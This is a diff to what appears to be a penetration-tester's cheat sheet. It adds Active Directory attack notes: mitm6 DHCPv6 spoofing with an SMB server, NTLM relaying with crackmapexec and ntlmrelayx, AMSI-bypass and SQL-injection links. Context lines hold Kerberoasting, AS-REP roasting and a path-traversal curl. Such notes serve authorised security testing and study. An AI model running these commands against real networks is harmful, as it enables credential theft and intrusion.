@@ -327,6 +327,8 @@ $ curl -L https://github.com/Kevin-Robertson/Inveigh/raw/master/Inveigh.ps1 > in
 PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y –NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
 ```
 
+#### InveighZero
+
 * [github.com/Kevin-Robertson/InveighZero](https://github.com/Kevin-Robertson/InveighZero)
 * [github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)
 
@@ -388,16 +390,17 @@ Deb dependencies (Ubuntu 18.04 LTS):
 ### DHCPv6 Spoofing
 
 
-#### mitm6.py
+#### mitm6
 
+* [github.com/fox-it/mitm6](https://github.com/fox-it/mitm6)
 * [blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
 * [intrinium.com/mitm6-pen-testing/](https://intrinium.com/mitm6-pen-testing/)
-* [github.com/fox-it/mitm6](https://github.com/fox-it/mitm6)
 
 ```
 $ git clone https://github.com/fox-it/mitm6
 $ python3 setup.py install
-$ mitm6.py -i eth0
+$ sudo mitm6.py -i eth0 -d megacorp.local
+$ sudo impacket-smbserver -smb2support share `pwd`
 ```
 
 
@@ -642,7 +645,8 @@ root@kali:$ samrdump.py 127.0.0.1
 
 ### RDP
 
-* [https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop](https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop)
+* [syfuhs.net/how-authentication-works-when-you-use-remote-desktop](https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop)
+* [swarm.ptsecurity.com/remote-desktop-services-shadowing/](https://swarm.ptsecurity.com/remote-desktop-services-shadowing/)
 
 
 #### Enable RDP
@@ -928,7 +932,12 @@ $ secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds
 
 ## NTLM
 
-### Responder
+* [en.hackndo.com/ntlm-relay/](https://en.hackndo.com/ntlm-relay/)
+* [blog.redforce.io/windows-authentication-and-attacks-part-1-ntlm/](https://blog.redforce.io/windows-authentication-and-attacks-part-1-ntlm/)
+
+
+
+### Responder Capture Structure
 
 `[SMB] NTLMv1 Hash` and `[SMB] NTLMv1-SSP Hash` capture structure:
 
@@ -949,6 +958,26 @@ $ secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds
 
 
 
+### NTLM Relay
+
+* [blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
+* [blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
+* [intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
+* [www.sans.org/blog/smb-relay-demystified-and-ntlmv2-pwnage-with-python/](https://www.sans.org/blog/smb-relay-demystified-and-ntlmv2-pwnage-with-python/)
+* [byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
+* [hunter2.gitbook.io/darthsidious/execution/responder-with-ntlm-relay-and-empire](https://hunter2.gitbook.io/darthsidious/execution/responder-with-ntlm-relay-and-empire)
+* [www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/](https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/)
+* [clement.notin.org/blog/2020/11/16/ntlm-relay-of-adws-connections-with-impacket/](https://clement.notin.org/blog/2020/11/16/ntlm-relay-of-adws-connections-with-impacket/)
+
+Generate relay list with CME and enumerate local admins when relaying
+
+```
+$ crackmapexec smb 192.168.2.0/24 --gen-relay-list out.txt
+$ sudo ntlmrelayx.py -smb2support --no-http-server -tf out.txt --enum-local-admins
+```
+
+
+
 
 ## ExecutionPolicy Bypass
 
@@ -960,6 +989,7 @@ $ secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds
 
 ## AMSI Bypass
 
+* [AMSI.fail](https://amsi.fail/)
 * [github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
 * [www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
 
@@ -2650,7 +2680,7 @@ $ lookupsid.py MEGACORP/s.freeside:'Passw0rd!'@127.0.0.1 20000
 $ GetUserSPNs.py MEGACORP/s.freeside:'Passw0rd!' -dc-ip 127.0.0.1 -save
 $ ./hashcat64.exe -m 13100 -a 0 -w 4 -O --session=snovvcrash hashes/asprep.txt seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
 
-$ GetNPUsers.py MEGACORP/ -dc-ip 127.0.0.1 -k -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile asprep.txt | tee GetNPUsers.log
+$ GetNPUsers.py MEGACORP/ -dc-ip 127.0.0.1 -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile asprep.txt | tee GetNPUsers.log
 $ cat GetNPUsers.log | grep -v 'Client not found in Kerberos database'
 $ ./hashcat64.exe -m 18200 -a 0 -w 4 -O --session=snovvcrash hashes/asprep.txt seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
 ```
@@ -3091,6 +3121,8 @@ root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//pr
 
 
 ## SQLi
+
+* [swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
 
 
 
